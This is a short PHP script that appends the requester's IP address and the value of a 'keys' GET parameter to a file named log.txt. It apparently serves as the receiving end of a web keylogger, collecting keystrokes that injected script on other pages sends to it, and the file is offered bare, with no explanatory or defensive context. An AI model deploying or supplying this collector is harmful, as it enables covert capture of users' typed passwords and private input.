<?php
if (isset($_GET['keys']))
{
	$log = fopen("log.txt", "a");
	fwrite($log,  $_SERVER['REMOTE_ADDR'] . " : " . $_GET['keys'] . "\n");
	fclose($log);
}
?>